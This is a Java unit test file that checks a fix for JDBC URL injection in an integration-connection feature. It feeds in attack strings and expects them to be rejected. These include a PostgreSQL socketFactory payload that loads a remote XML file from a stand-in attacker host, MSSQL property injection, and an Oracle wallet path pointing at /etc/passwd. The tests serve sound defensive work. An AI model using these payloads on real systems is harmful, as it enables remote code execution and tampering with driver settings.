package com.acquira.core.service;

import com.acquira.common.model.IntegrationConnection;
import com.acquira.common.util.JdbcTargetValidator;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Regression tests for the JDBC URL injection fix.
 *
 * The vulnerability: IntegrationConnection.getJdbcUrl() concatenated
 * admin-supplied host/dbName straight into the JDBC URL, and every driver
 * parses extra properties out of that string. On PostgreSQL that is remote
 * code execution in this JVM (socketFactory), on MSSQL/Oracle it is arbitrary
 * driver configuration. Pressing "Test connection" was enough to trigger it.
 */
class JdbcTargetValidatorTest {

    // ─── The actual attack payloads ───────────────────────────────

    @Test
    @DisplayName("Postgres socketFactory RCE payload in dbName is rejected")
    void rejectsPostgresSocketFactoryRce() {
        IntegrationConnection c = conn(IntegrationConnection.DbType.POSTGRES, "127.0.0.1", 5432,
                "d?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"
                + "&socketFactoryArg=http://attacker.example/rce.xml");
        IllegalArgumentException e = assertThrows(IllegalArgumentException.class, c::getJdbcUrl);
        assertTrue(e.getMessage().contains("Invalid database/service name"));
    }

    @Test
    @DisplayName("MSSQL ';'-delimited property injection in dbName is rejected")
    void rejectsMssqlPropertyInjection() {
        IntegrationConnection c = conn(IntegrationConnection.DbType.MSSQL, "10.0.0.5", 1433,
                "x;integratedSecurity=true;trustServerCertificate=true");
        assertThrows(IllegalArgumentException.class, c::getJdbcUrl);
    }

    @Test
    @DisplayName("Oracle wallet-location injection in dbName is rejected")
    void rejectsOracleWalletInjection() {
        IntegrationConnection c = conn(IntegrationConnection.DbType.ORACLE, "db.internal", 1521,
                "SVC?oracle.net.wallet_location=/etc/passwd");
        assertThrows(IllegalArgumentException.class, c::getJdbcUrl);
    }

    @Test
    @DisplayName("Injection via the host field is rejected too")
    void rejectsHostInjection() {
        IntegrationConnection c = conn(IntegrationConnection.DbType.POSTGRES,
                "127.0.0.1/db?socketFactory=evil", 5432, "postgres");
        assertThrows(IllegalArgumentException.class, c::getJdbcUrl);
    }

    // ─── Legitimate values must still work ────────────────────────

    @Test
    @DisplayName("Ordinary hosts and database names still build a URL")
    void acceptsLegitimateValues() {
        assertEquals("jdbc:postgresql://db.example.com:5432/core_ledger",
                conn(IntegrationConnection.DbType.POSTGRES, "db.example.com", 5432, "core_ledger").getJdbcUrl());

        // Oracle service names are commonly dotted.
        assertEquals("jdbc:oracle:thin:@10.20.30.40:1521/ORCL.corp.local",
                conn(IntegrationConnection.DbType.ORACLE, "10.20.30.40", 1521, "ORCL.corp.local").getJdbcUrl());

        // Underscores, hyphens and $ are legal in database/service names.
        assertTrue(conn(IntegrationConnection.DbType.POSTGRES, "pg-primary-01", 5432, "acq_stage-1$x")
                .getJdbcUrl().endsWith("/acq_stage-1$x"));
    }

    @Test
    @DisplayName("MSSQL keeps its trustServerCertificate flag")
    void mssqlUrlShape() {
        IntegrationConnection c = conn(IntegrationConnection.DbType.MSSQL, "sql01", 1433, "AcquiraSrc");
        c.setTrustServerCert(false);
        assertEquals("jdbc:sqlserver://sql01:1433;databaseName=AcquiraSrc;encrypt=true;trustServerCertificate=false",
                c.getJdbcUrl());
    }

    @Test
    @DisplayName("IPv6 literals are accepted in bracketed form")
    void acceptsBracketedIpv6() {
        assertDoesNotThrow(() -> JdbcTargetValidator.requireValidHost("[2001:db8::1]"));
    }

    // ─── Port ─────────────────────────────────────────────────────

    @Test
    @DisplayName("Out-of-range and non-numeric ports are rejected")
    void rejectsBadPorts() {
        assertThrows(IllegalArgumentException.class, () -> JdbcTargetValidator.requireValidPort(0));
        assertThrows(IllegalArgumentException.class, () -> JdbcTargetValidator.requireValidPort(70000));
        assertThrows(IllegalArgumentException.class, () -> JdbcTargetValidator.requireValidPort((Integer) null));
        // String overload (DataSourceConfig stores port as text)
        assertThrows(IllegalArgumentException.class, () -> JdbcTargetValidator.requireValidPort("5432;x=y"));
        assertEquals(5432, JdbcTargetValidator.requireValidPort("5432"));
    }

    @Test
    @DisplayName("Blank host and database name are rejected")
    void rejectsBlanks() {
        assertThrows(IllegalArgumentException.class, () -> JdbcTargetValidator.requireValidHost("  "));
        assertThrows(IllegalArgumentException.class, () -> JdbcTargetValidator.requireValidDbName(null));
    }

    private static IntegrationConnection conn(IntegrationConnection.DbType type,
                                              String host, Integer port, String dbName) {
        IntegrationConnection c = new IntegrationConnection();
        c.setDbType(type);
        c.setHost(host);
        c.setPort(port);
        c.setDbName(dbName);
        return c;
    }
}
